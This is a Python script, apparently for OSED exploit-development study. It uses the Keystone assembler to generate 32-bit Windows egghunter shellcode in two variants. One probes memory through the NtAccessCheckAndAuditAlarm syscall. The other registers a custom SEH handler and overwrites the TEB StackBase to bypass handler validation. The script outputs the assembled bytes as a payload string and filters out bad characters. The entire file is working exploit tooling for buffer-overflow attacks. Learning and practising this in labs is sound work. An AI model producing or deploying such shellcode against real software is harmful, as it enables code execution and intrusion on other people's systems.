#!/usr/bin/python3
import sys
import argparse
import keystone as ks


def is_valid_tag_count(s):
    return True if len(s) == 4 else False


def tag_to_hex(s):
    string = s
    if is_valid_tag_count(s) == False:
        args.tag = "c0d3"
        string = args.tag
    retval = list()
    for char in string:
        retval.append(hex(ord(char)).replace("0x", ""))
    return "0x" + "".join(retval[::-1])


def ntaccess_hunter(tag):
    asm = [
        # Use the edx register as a memory page counter
        "loop_inc_page:",
            "or dx, 0x0fff", # Go to the last address in the memory page
        "loop_inc_one:",
            "inc edx", # Increase the memory counter by one
        "loop_check:",
            "push edx", # Save the dex register which holds memory address on the stack
            "xor eax, eax",
            "add ax, 0x01c6",
            "int 0x2e", # Perform sys call
            "cmp al, 05", # Check for x05
            "pop edx",
        "loop_check_valid:",
            "je loop_inc_page", # Redo, but edx already + 1
        "is_egg:",
            f"mov eax, {tag_to_hex(tag)}",  # Load egg into eax
            "mov edi, edx",
            "scasd", # Verify first half
            "jnz loop_inc_one",
        "first_half_found:",
            "scasd", # Verify second half
            "jnz loop_inc_one",
        "matched_both_halves:",
            "jmp edi" # Matches, jump to the egg
    ]
    return "\n".join(asm)


def seh_hunter(tag):
    asm = [
        "start:",
            "jmp get_seh_address",  # start of jmp/call/pop
            "build_exception_record:",
            "pop ecx",  # address of exception_handler
            f"mov eax, {tag_to_hex(tag)}",  # tag into eax
            "push ecx",  # push Handler of the _EXCEPTION_REGISTRATION_RECORD structure
            "push 0xffffffff",  # push Next of the _EXCEPTION_REGISTRATION_RECORD structure
            "xor ebx, ebx",
            "mov dword ptr fs:[ebx], esp",  # overwrite ExceptionList in the TEB with a pointer to our new _EXCEPTION_REGISTRATION_RECORD structure
            # bypass RtlIsValidHandler's StackBase check by placing the memory address of our _except_handler function at a higher address than the StackBase.
            "sub ecx, 0x04",  # substract 0x04 from the pointer to exception_handler
            "add ebx, 0x04",  # add 0x04 to ebx
            "mov dword ptr fs:[ebx], ecx",  # overwrite the StackBase in the TEB
        "is_egg:",
            "push 0x02",
            "pop ecx",  # load 2 into counter
            "mov edi, ebx",  # move memory page address into edi
            "repe scasd",  # check for tag, if the page is invalid we trigger an exception and jump to our exception_handler function
            "jnz loop_inc_one",  # didn't find signature, increase ebx and repeat
            "jmp edi",  # found the tag
        "loop_inc_page:",
            "or bx, 0xfff",  # if page is invalid the exception_handler will update eip to point here and we move to next page
        "loop_inc_one:",
            "inc ebx",  # increase memory page address by a byte
            "jmp is_egg",  # check for the tag again
        "get_seh_address:",
            "call build_exception_record",  # call portion of jmp/call/pop
            "push 0x0c",
            "pop ecx",  # store 0x0c in ecx to use as an offset
            "mov eax, [esp+ecx]",  # mov into eax the pointer to the CONTEXT structure for our exception
            "mov cl, 0xb8",  # mov 0xb8 into ecx which will act as an offset to the eip
            # increase the value of eip by 0x06 in our CONTEXT so it points to the "or bx, 0xfff" instruction to increase the memory page
            "add dword ptr ds:[eax+ecx], 0x06",
            "pop eax",  # save return address in eax
            "add esp, 0x10",  # increase esp to clean the stack for our call
            "push eax",  # push return value back into the stack
            "xor eax, eax",  # null out eax to simulate ExceptionContinueExecution return
            "ret",
    ]
    return "\n".join(asm)


def main(args):
    # Initialize engine in 32-bit mode
    eng = ks.Ks(ks.KS_ARCH_X86, ks.KS_MODE_32)

    if args.seh:
        egghunter = seh_hunter(args.tag)
    else:
        egghunter = ntaccess_hunter(args.tag)

    encoding, count = eng.asm(egghunter)

    final = 'egghunter = b"'

    for enc in encoding:
        final += "\\x{0:02x}".format(enc)

    final += '"'

    sentry = False

    for bad in args.bad_chars:
        if bad in final:
            print(f"[!] Found 0x{bad}")
            sentry = True

    if sentry:
        print(f"[=] {final[14:-1]}", file=sys.stderr)
        raise SystemExit("[!] Remove bad characters and try again")

    print(f"[+] egghunter created!")
    print(f"[=]   len: {len(encoding)} bytes")
    print(f"[=]   tag: {args.tag * 2}")
    print(f"[=]   ver: {['NtAccessCheckAndAuditAlarm', 'SEH'][args.seh]}\n")
    print(final)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Creates an egghunter for OSED"
    )

    parser.add_argument(
        "-t",
        "--tag",
        help="tag for which the egghunter will search (default: tagx)",
        default="tagx",
    )
    parser.add_argument(
        "-b",
        "--bad-chars",
        help="space separated list of bad chars to check for in final egghunter (default: 00)",
        default=["00"],
        nargs="+",
    )
    parser.add_argument(
        "-s",
        "--seh",
        help="create an seh based egghunter instead of NtAccessCheckAndAuditAlarm",
        action="store_true",
    )

    args = parser.parse_args()

    main(args)
